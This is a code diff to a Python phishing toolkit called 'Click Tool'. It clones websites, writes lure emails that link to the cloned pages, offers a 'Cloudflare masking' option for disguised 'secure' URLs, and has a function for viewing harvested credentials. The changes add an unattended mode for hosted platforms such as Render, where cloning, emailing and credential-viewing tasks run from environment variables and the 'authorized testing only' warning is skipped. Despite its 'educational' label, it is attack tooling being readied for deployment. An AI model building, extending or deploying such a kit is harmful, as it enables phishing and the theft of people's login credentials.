@@ -135,35 +135,70 @@ def get_list_of_cloned_sites():
                 sites.append(item)
     return sites
 
-def send_email():
+def safe_input(prompt, default="1", is_interactive=False):
+    """
+    Safe input function that handles EOFError in non-interactive environments
+    
+    Args:
+        prompt: The prompt message
+        default: Default value if no input available
+        is_interactive: Whether we're in interactive mode
+    
+    Returns:
+        User input or default value
+    """
+    if not is_interactive:
+        safe_print(f"[AUTO] Using default: {default} - {prompt}")
+        return default
+    
+    try:
+        return input(prompt).strip()
+    except (EOFError, KeyboardInterrupt):
+        safe_print(f"\n[WARNING] No input detected, using default: {default}")
+        return default
+
+def send_email(is_interactive=False):
     """Send an email (demo)"""
     safe_print("\n[EMAIL] Prepare Email")
-    sender = input("[FROM] Sender email: ").strip()
-    receiver = input("[TO] Receiver email: ").strip()
-    subject = input("[SUBJECT] Subject: ").strip()
-    body = input("[BODY] Body (use {url} for link): ").strip()
-    use_cloudflare = input("[CLOUDFLARE] Use Cloudflare masking? (y/n): ").strip().lower() == 'y'
+    
+    # Use safe_input for all prompts
+    sender = safe_input("[FROM] Sender email: ", default="demo@example.com", is_interactive=is_interactive)
+    receiver = safe_input("[TO] Receiver email: ", default="recipient@example.com", is_interactive=is_interactive)
+    subject = safe_input("[SUBJECT] Subject: ", default="Demo Email - Click Tool", is_interactive=is_interactive)
+    body = safe_input("[BODY] Body (use {url} for link): ", default="Click here: {url}", is_interactive=is_interactive)
+    use_cloudflare = safe_input("[CLOUDFLARE] Use Cloudflare masking? (y/n): ", default="n", is_interactive=is_interactive).lower() == 'y'
+    
     sites = get_list_of_cloned_sites()
     if not sites:
         safe_print("[ERROR] No cloned websites found. Clone a website first (option 1).")
         return
+    
     safe_print("\n[AVAILABLE SITES]")
     for i, site in enumerate(sites, 1):
         safe_print(f"  {i}. {site}")
-    try:
-        selection = int(input("[SELECT] Choose number: ").strip())
-        if selection < 1 or selection > len(sites):
-            safe_print("[ERROR] Invalid selection.")
+    
+    # Allow selection or use first site
+    if is_interactive:
+        try:
+            selection = int(input("[SELECT] Choose number: ").strip())
+            if selection < 1 or selection > len(sites):
+                safe_print("[ERROR] Invalid selection.")
+                return
+            selected_site = sites[selection - 1]
+        except ValueError:
+            safe_print("[ERROR] Invalid input.")
             return
-        selected_site = sites[selection - 1]
-    except ValueError:
-        safe_print("[ERROR] Invalid input.")
-        return
+    else:
+        selected_site = sites[0]
+        safe_print(f"[AUTO] Using first site: {selected_site}")
+    
     if use_cloudflare:
         url_name = f"https://secure.localhost:8080.cf/{selected_site}/index.html"
     else:
         url_name = f"http://localhost:8000/{selected_site}/index.html"
+    
     final_body = body.replace("{url}", url_name)
+    
     safe_print("\n[EMAIL PREVIEW]")
     safe_print("=" * 50)
     safe_print(f"From: {sender}")
@@ -172,6 +207,7 @@ def send_email():
     safe_print(f"Body:\n{final_body}")
     safe_print("=" * 50)
     safe_print(f"[URL] {url_name}")
+    
     email_log = {
         "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
         "sender": sender,
@@ -181,14 +217,17 @@ def send_email():
         "url": url_name,
         "cloned_site": selected_site
     }
+    
     try:
         with open(CONFIG["email_log_file"], "r", encoding="utf-8") as f:
             logs = json.load(f)
     except (FileNotFoundError, json.JSONDecodeError):
         logs = []
+    
     logs.append(email_log)
     with open(CONFIG["email_log_file"], "w", encoding="utf-8") as f:
         json.dump(logs, f, indent=4, ensure_ascii=False)
+    
     safe_print("\n[DEMO MODE] Email would be sent via SMTP in production.")
     safe_print("[NOTE] For educational purposes only!")
 
@@ -276,15 +315,100 @@ def view_harvested_credentials():
     except Exception as e:
         safe_print(f"[ERROR] Reading credentials: {e}")
 
-def main():
-    """Main menu loop"""
-    setup_environment()
+def view_email_logs():
+    """View email logs"""
+    try:
+        with open(CONFIG["email_log_file"], "r", encoding="utf-8") as f:
+            logs = json.load(f)
+        if logs:
+            safe_print("\n[EMAIL LOGS]")
+            for i, log in enumerate(logs, 1):
+                safe_print(f"[{i}] {log.get('timestamp', 'N/A')} - To: {log.get('receiver', 'N/A')}")
+        else:
+            safe_print("No email logs found.")
+    except Exception as e:
+        safe_print(f"[ERROR] Reading logs: {e}")
 
-    safe_print("""
+def is_interactive_environment():
+    """
+    Check if running in an interactive environment
+    
+    Returns:
+        bool: True if interactive, False if running on Render or similar
+    """
+    # Check for Render environment
+    if os.environ.get('RENDER'):
+        return False
+    
+    # Check if stdin is a terminal
+    if not sys.stdin.isatty():
+        return False
+    
+    # Check for other deployment environments
+    if os.environ.get('CI') or os.environ.get('GITHUB_ACTIONS'):
+        return False
+    
+    return True
+
+def run_automated_tasks():
+    """Run default tasks in automated mode"""
+    safe_print("=" * 60)
+    safe_print("🚀 RUNNING IN AUTOMATED MODE ON RENDER")
+    safe_print("=" * 60)
+    
+    # You can configure which tasks to run here
+    tasks_to_run = [
+        # Uncomment tasks you want to run automatically
+        # "clone",
+        # "email",
+        # "credentials",
+        # "logs"
+    ]
+    
+    # If no tasks specified, run default
+    if not tasks_to_run:
+        safe_print("ℹ️ No automated tasks configured. Use Render environment variables to configure.")
+        safe_print("📋 Available tasks: clone, email, credentials, logs")
+        safe_print("📝 Example: Set environment variable AUTO_TASKS=clone,email")
+        return
+    
+    # Run specified tasks
+    for task in tasks_to_run:
+        if task == "clone":
+            default_url = os.environ.get('CLONE_URL', 'https://example.com')
+            safe_print(f"\n[Task] Cloning website: {default_url}")
+            clone_website(default_url)
+        elif task == "email":
+            safe_print("\n[Task] Sending demo email")
+            send_email(is_interactive=False)
+        elif task == "credentials":
+            safe_print("\n[Task] Viewing credentials")
+            view_harvested_credentials()
+        elif task == "logs":
+            safe_print("\n[Task] Viewing email logs")
+            view_email_logs()
+    
+    safe_print("\n✅ All automated tasks completed!")
+
+def main():
+    """Main menu loop with environment detection"""
+    setup_environment()
+    
+    # Check if we're in interactive mode
+    interactive = is_interactive_environment()
+    
+    # Show warning only in interactive mode
+    if interactive:
+        safe_print("""
     [WARNING] Educational & Authorized Testing Only!
     Unauthorized use is ILLEGAL.
     """)
-
+    else:
+        # Run automated tasks and exit
+        run_automated_tasks()
+        return
+    
+    # Interactive menu loop (only runs in interactive mode)
     while True:
         safe_print("""
     [CLICK TOOL]
@@ -307,23 +431,13 @@ def main():
                 clone_website(url)
 
             elif choice == "2":
-                send_email()
+                send_email(is_interactive=True)
 
             elif choice == "3":
                 view_harvested_credentials()
 
             elif choice == "4":
-                try:
-                    with open(CONFIG["email_log_file"], "r", encoding="utf-8") as f:
-                        logs = json.load(f)
-                    if logs:
-                        safe_print("\n[EMAIL LOGS]")
-                        for i, log in enumerate(logs, 1):
-                            safe_print(f"[{i}] {log.get('timestamp', 'N/A')} - To: {log.get('receiver', 'N/A')}")
-                    else:
-                        safe_print("No email logs found.")
-                except Exception as e:
-                    safe_print(f"[ERROR] Reading logs: {e}")
+                view_email_logs()
 
             elif choice == "5":
                 safe_print("Exiting...")
@@ -335,9 +449,13 @@ def main():
         except KeyboardInterrupt:
             safe_print("\nCancelled.")
             continue
+        except EOFError:
+            safe_print("\n[ERROR] No input available in non-interactive mode.")
+            safe_print("Running in automated mode...")
+            run_automated_tasks()
+            break
         except Exception as e:
             safe_print(f"[ERROR] {e}")
-
 
 if __name__ == "__main__":
     main()
